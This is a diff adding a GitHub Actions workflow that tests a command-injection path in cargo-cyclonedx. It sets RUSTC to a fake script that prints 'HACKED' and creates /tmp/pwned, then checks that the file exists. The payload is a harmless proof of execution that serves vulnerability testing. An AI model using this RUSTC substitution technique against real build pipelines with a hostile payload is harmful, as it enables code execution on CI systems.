@@ -1,0 +1,26 @@
+
+name: Test Cargo CycloneDX RUSTC Injection
+
+on: [push, pull_request]  # ⚠️ Runs on PRs (potential security risk)
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v2
+
+      - name: Install Cargo CycloneDX
+        run: cargo install cargo-cyclonedx
+
+      - name: Generate SBOM (Test Exploit)
+        run: |
+          echo '#!/bin/bash' > fake_rustc
+          echo 'echo "HACKED" >&2' >> fake_rustc  # Arbitrary command execution
+          echo 'touch /tmp/pwned' >> fake_rustc   # Proof of execution
+          chmod +x fake_rustc
+          
+          RUSTC=./fake_rustc cargo cyclonedx --verbose
+
+      - name: Check if Exploit Worked
+        run: ls -l /tmp/pwned  # If this file exists, the exploit was successful!
